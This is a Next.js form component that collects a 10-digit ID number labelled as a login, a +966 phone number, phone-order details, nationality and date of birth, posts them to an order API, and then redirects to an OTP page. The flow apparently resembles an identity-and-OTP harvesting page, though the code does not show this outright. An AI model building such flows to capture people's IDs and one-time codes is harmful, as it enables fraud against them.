import { FaArrowRightLong } from "react-icons/fa6";
import { useRouter, useSearchParams } from "next/navigation";
import "react-phone-number-input/style.css";
// import PhoneInput from "react-phone-number-input";
import toast from "react-hot-toast";
import SwiperSlider from "@/components/SwiperSlider";
import { Button } from "@nextui-org/react";
import { useState } from "react";
// import PhoneInput from 'react-phone-number-input';
import "react-phone-number-input/style.css";

const UserInfo = () => {
  const router = useRouter();
  const searchParams = useSearchParams();
  const params = new URLSearchParams(searchParams);
  const [userName, setUserName] = useState("");
  const [isFormSubmit, setIsFormSubmit] = useState(false);
  // const [value, setValue] = useState("+966");

  // // Create a custom input component with forwardRef and assign a display name
  // const CustomInput = forwardRef(({ ...props }, ref) => (
  //   <input
  //     ref={ref}
  //     {...props}
  //     className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
  //   />
  // ));

  // // Assign a display name to the custom input component
  // CustomInput.displayName = "CustomInput";

  const handleSubmit = (event) => {
    event.preventDefault();
    setIsFormSubmit(true);
    if (userName.length !== 10) return;

    const submitData = {
      identity: event.target.identity.value,
      password: "n/a",
      phone: event.target.phone.value,
      model: params.get("model"),
      color: params.get("color"),
      storage: params.get("storage"),
      nationality: params.get("nationality"),
      dob: params.get("dob"),
    };
    if (submitData.identity === "") {
      toast.error("Please enter your identity");
    } else if (submitData.phone === "") {
      toast.error("Please enter your phone number");
    } else if (submitData.email === "") {
      toast.error("Please enter your email");
    } else if (submitData.model === "") {
      toast.error("Please enter your model");
    } else if (submitData.color === "") {
      toast.error("Please enter your color");
    } else if (submitData.storage === "") {
      toast.error("Please enter your storage");
    } else if (submitData.nationality === "") {
      toast.error("Please enter your nationality");
    } else if (submitData.dob === "") {
      toast.error("Please enter your date of birth");
    } else {
      // router.push('/first-otp')
      fetch(`${process.env.API_URL}/api/order`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            toast.success("Your user details has been uploaded successfully!");
            router.push({
              pathname: "/first-otp",
              query: { id: data._id },
            });
          } else {
            toast.error("Sorry, we couldn't process your request!");
          }
        })
        .catch((err) => {
          toast.error(err.message);
        });
    }
  };

  return (
    <>
      <SwiperSlider />
      <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
        <h1 className="text-4xl font-bold text-gray-600 mt-10">User Info</h1>
        <form onSubmit={handleSubmit} className="w-3/4 my-14">
          <div className="mb-6">
            <div className="relative z-0 w-full group">
              <input
                type="number"
                name="identity"
                id="identity"
                onChange={(e) => setUserName(e.target.value)}
                className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
                placeholder=""
                required
              />
              <label
                htmlFor="identity"
                className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
              >
                Username or ID Number
              </label>
            </div>
            {userName.length !== 10 &&
              userName.length !== 0 &&
              isFormSubmit && (
                <p
                  style={{ color: "red" }}
                  className="text-sm font-medium pt-1"
                >
                  User ID Number must be exactly 10 digits
                </p>
              )}
            {userName.length === 0 && isFormSubmit && (
              <p style={{ color: "red" }} className="text-sm font-medium pt-1">
                User ID Number is required
              </p>
            )}
          </div>
          {/* <div className="grid md:grid-cols-2 md:gap-6"> */}
          {/* <div className="relative z-0 w-full mb-6 group">
              <input
                type="text"
                name="password"
                id="password"
                className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
                placeholder=""
                required
              />
              <label
                htmlFor="password"
                className="z-10 peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
              >
                Password
              </label>
            </div> */}
          <div>
            {/* <PhoneInput
              placeholder="Enter phone number"
              value={value}
              onChange={setValue}
            /> */}
            <div className="relative z-0 w-full mb-6 group">
              <input
                type="tel"
                // pattern="[0-9]{3}-[0-9]{2}-[0-9]{3}"
                name="phone"
                id="phone"
                defaultValue="+966"
                className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
                placeholder=" "
                required
              />
              <label
                htmlFor="phone"
                className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
              >
                Phone number
              </label>
            </div>
          </div>
          {/* <div className="relative z-0 w-full mb-6 group">
            <PhoneInput
              placeholder="Enter phone number"
              value={value}
              onChange={(e) => setValue(e.target.value)}
              defaultCountry="SA"
              inputComponent={CustomInput} // Pass the custom input component
            />
            <label
              htmlFor="phone"
              className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
            >
              Phone number
            </label>
          </div> */}
          {/* </div> */}
          {/* <button
            type="submit"
            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
          >
            LOG IN <FaArrowRightLong size={16} />
          </button> */}
          <Button
            color="primary"
            type="submit"
            className={`w-full text-white h-12 bg-[#0D9488]`}
          >
            LOG IN <FaArrowRightLong size={16} />
          </Button>
        </form>
      </div>
      <div className="h-20 bg-teal-400 mt-5"></div>
    </>
  );
};

export default UserInfo;
